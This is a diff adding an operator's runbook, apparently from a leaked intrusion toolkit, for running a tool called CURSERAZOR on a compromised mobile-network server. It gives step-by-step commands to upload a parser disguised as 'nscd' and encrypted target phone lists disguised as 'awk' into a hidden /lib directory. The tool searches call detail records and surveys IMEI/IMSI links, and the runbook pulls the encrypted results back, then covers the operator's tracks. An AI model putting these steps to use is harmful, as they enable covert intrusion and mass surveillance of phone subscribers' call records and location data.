@@ -1,0 +1,235 @@
+################ CURSERAZOR #########################
+############### PARSING  ###################################################################
+
+### vi Search/Replace commands ###
+### ProjectName - self explanatory
+### Date field - today's date, used for output files
+### Host - hostname of the box (not IP address)
+### Cryptkey - encryption key (use output from below md5sum command)
+
+md5sum /current/down/tcpdump.raw
+
+mx
+:%s/PROJECTNAME/PROJECTNAME/g
+:%s/DDMonYY/DDMonYY/g
+:%s/HOST/HOST/g
+:%s/CRYPTKEY/CRYPTKEY/g
+'x 
+
+### Save the encryption key locally:
+
+echo CRYPTKEY > /current/down/cryptkey.curserazor.DDMonYY
+
+####### Prepare files containing numbers to search for:
+
+# if files containing the numbers to search available:
+mkdir /current/down/argfiles
+cd /current/down/argfiles
+mz
+cp /mnt/zip*/arg* /current/down/argfiles
+	#or
+cp /mnt/zip*/PROJECTNAME/arg* /current/down/argfiles
+
+ls -altr
+
+
+### Prep the argfiles:
+### make sure the files are ASCII and contain NO EMPTY LINES!!
+### make sure the last line does not contain a null character at the end
+###	(vi the file, add a carriage return to the last line, then delete the empty
+###	line and save)
+### "file" results:
+### 	This will not work: ASCII text, with CRLF line terminators
+### 	This WILL: 	    ASCII text
+cat arg*
+file arg*
+dos2unix arg*
+file arg*
+
+# if no data media is provided: 
+# locally, create a file of numbers to grep for with each number on a separate line
+#       make sure there are NO EMPTY LINES!!!!
+# if searching for LACs and cell id's, use the format in the documentation:
+#        ex. - 410 01 95 18374
+# if searching for phone numbers, use the normal format:
+#        ex. - 4837506
+
+cd /current/down/argfiles
+vi /current/down/argfiles/argfile1.txt
+
+
+### Make sure find the cryptTool...add to PATH if which fails...
+which cryptTool.v1.0.Linux2.4.18-14.targetdl
+
+### To encrypt one at a time...
+cryptTool.v1.0.Linux2.4.18-14.targetdl -i argfile1.txt -o argfile1.enc -k CRYPTKEY -b
+cryptTool.v1.0.Linux2.4.18-14.targetdl -i argfile2.txt -o argfile2.enc -k CRYPTKEY -b
+
+file argfile*.enc
+
+### Loop to encrypt all the argfiles
+cd /current/down/argfiles
+for i in argfile*.txt; do cryptTool.v1.0.Linux2.4.18-14.targetdl -i $i -o $i.enc -k CRYPTKEY -b
+
+file argfile*.enc
+
+
+########## To look at CDR directories try the following:
+
+### Use the following commands to determine the location of current
+### CDR data storage;  Once you identify the location of the data, you'll
+### use the head/tail commands to determine the date ranges being saved.
+### These date ranges will be used as args in the curserazor commands.
+
+### Typical file locations per host:
+
+########################## hazyrazor:
+# paths based on isb-ser-imelive	172.20.16.136
+
+ls -l /ImE/data05_loc/DATA_5.0/OUTPUT/MSC/ARCHIVE/*200710*GCDR$ | wc
+ls -l /ImE/data05_loc/DATA_5.0/OUTPUT/MSC/ARCHIVE/ | grep 200710.*GCDR$ | head -30
+ls -l /ImE/data05_loc/DATA_5.0/OUTPUT/MSC/ARCHIVE/ | grep 200710.*GCDR$ | tail -30
+
+### Tips for running the CURSERAZOR 1.1
+
+        ### DO NOT _APPEND_ to the local file if using encryption - (no >>L: or >>T: )!!!!
+        ###     per each argfile, create .enc1, .enc1.more, .enc1.more2, etc if additional
+        ###             passes are needed for the date range
+        ### The phone list is deleted automatically 
+
+
+######## Upload the parser (CURSERAZOR) and call it nscd
+# put up the parser tool
+# First, using a wildcard, confirm our hidden directory (and that we are priveleged)
+-ctrl -d
+# or maybe something like this?
+-ls /lib/.02dbb*
+
+# Now (using the full path, this wildcard will fail), cd there and add it to our path
+-cd /lib/.02dbb*
+-addpath .
+
+# Put up the tool as nscd
+-put /current/up/curserazor.v1.1.SunOS5.10.targetdl nscd
+which nscd
+-lt
+-setenv B=-k CRYPTKEY -z "find /ImE/data05_loc/DATA_5.0/OUTPUT/MSC/ARCHIVE/ -name '*2007103*GCDR' -print" -P ./awk
+-ls -t
+which nscd
+
+
+#####  Upload the encrypted phone list as awk, modify each parser command to have the
+##### correct directory and date range of files to parse, then run the parser:
+
+##### NOTE: MUST CORRELATE NUMBERS IN ENCRYPTED TASKING FILENAMES (i.e. argfile1.enc)
+##### TO OUTPUT FILENAMES (cdrhits*.enc1, cdrhits*.enc1.more, cdrhits*.enc1.more2, etc.)
+
+##### NOTE2: GO FROM MOST RECENT TIME TO (PROBABLY CURRENT DATE) AS FAR BACK AS TIME ALLOWS
+
+############ argfile 1
+
+-put /current/down/argfiles/argfile1.enc awk
+-setenv B=-k CRYPTKEY -z "find /ImE/data05_loc/DATA_5.0/OUTPUT/MSC/ARCHIVE/ -name '*2007103*GCDR' -print" -P ./awk
+nscd >T:/current/down/cdrhits.curserazor.HOST.DDMonYY.enc1
+-beep 15
+
+### Run again if needed for same tasking
+-put /current/down/argfiles/argfile1.enc awk
+-setenv B=-k CRYPTKEY -z "find /ImE/data05_loc/DATA_5.0/OUTPUT/MSC/ARCHIVE/ -name '*2007102[89]*GCDR' -print" -P ./awk
+./nscd >T:/current/down/cdrhits.curserazor.HOST.DDMonYY.enc1.more
+-beep 15
+
+
+############ argfile 2
+
+-put /current/down/argfiles/argfile2.enc awk
+-setenv B=-k CRYPTKEY -z "find /ImE/data05_loc/DATA_5.0/OUTPUT/MSC/ARCHIVE/ -name '*2007103*GCDR' -print" -P ./awk
+nscd >T:/current/down/cdrhits.curserazor.HOST.DDMonYY.enc2
+-beep 15
+
+### Run again if needed for same tasking
+-put /current/down/argfiles/argfile2.enc awk
+-setenv B=-k CRYPTKEY -z "find /ImE/data05_loc/DATA_5.0/OUTPUT/MSC/ARCHIVE/ -name '*2007102[89]*GCDR' -print" -P ./awk
+./nscd >T:/current/down/cdrhits.curserazor.HOST.DDMonYY.enc2.more
+-beep 15
+
+
+############ argfile 3
+
+-put /current/down/argfiles/argfile2.enc awk
+-setenv B=-k CRYPTKEY -z "find /ImE/data05_loc/DATA_5.0/OUTPUT/MSC/ARCHIVE/ -name '*2007103*GCDR' -print" -P ./awk
+nscd >T:/current/down/cdrhits.curserazor.HOST.DDMonYY.enc2
+-beep 15
+
+### Run again if needed for same tasking
+-put /current/down/argfiles/argfile2.enc awk
+-setenv B=-k CRYPTKEY -z "find /ImE/data05_loc/DATA_5.0/OUTPUT/MSC/ARCHIVE/ -name '*2007102[89]*GCDR' -print" -P ./awk
+./nscd >T:/current/down/cdrhits.curserazor.HOST.DDMonYY.enc2.more
+-beep 15
+
+
+######
+######  survey mode:
+######
+
+### checks for IMEIs that have more than one IMSI associated with it:
+### to limit amount of memory used, replace "-x" with "-X numberBytes"
+-setenv B=-k CRYPTKEY -z "find /ImE/data05_loc/DATA_5.0/OUTPUT/MSC/ARCHIVE/ -name '*2007102[89]*GCDR' -print" -x
+./nscd >T:/current/down/cdrhits.curserazor.HOST.DDMonYY.enc.surveyIMEI
+
+
+### generates a list of Cell IDs associated with each MSC address:
+### to limit amount of memory used, replace "-y" with "-Y numberBytes"
+-setenv B=-k CRYPTKEY -z "find /ImE/data05_loc/DATA_5.0/OUTPUT/MSC/ARCHIVE/ -name '*2007102[89]*GCDR' -print" -y
+./nscd >T:/current/down/cdrhits.curserazor.HOST.DDMonYY.enc.surveyMSC
+
+
+######
+#####  when it's done running, decrypt the file (-d -c options)
+######
+
+cd /current/down
+ls -latr cdrhits*enc*
+
+# to decrypt individually:
+cryptTool.v1.0.Linux2.4.18-14.targetdl -i cdrhits.curserazor.HOST.DDMonYY.enc1 -o cdrhits.curserazor.HOST.DDMonYY.txt1 -k CRYPTKEY -d -c
+cryptTool.v1.0.Linux2.4.18-14.targetdl -i cdrhits.curserazor.HOST.DDMonYY.enc2 -o cdrhits.curserazor.HOST.DDMonYY.txt2 -k CRYPTKEY -d -c
+
+
+# or decrypt all at one time (once all are written fully)
+cd /current/down
+for i in cdrhits*enc* ; do n="`echo $i | sed \"s,enc,txt,g\"`" ; cryptTool.v1.0.Linux2.4.18-14.targetdl -i $i -o $n -k CRYPTKEY -d -c ; done
+ls -latr cdr*txt*
+
+######
+######	If you need to stop the parser before it completes:
+### Control-C the nopen window containing the parser command
+### ps -ef |grep nscd
+### if the parser command is still "running", then kill the process:
+### kill -9 <PID> 
+### You'll still be able to decrypt the partially completed data pull
+
+######
+######  copy DECRYPTED data to media
+######
+ls -l cdrhits*txt*
+mz
+cp cdrhits*txt* /mnt/zip*/PROJECTNAME
+ls -l /mnt/zip*/PROJECTNAME
+uz
+
+
+#####
+#####  clean up
+#####
+-rm nscd awk
+-lt
+-cd /tmp
+-lt
+
+w
+ps -ef | sort
+-lt /
+
+-burnBURN
+
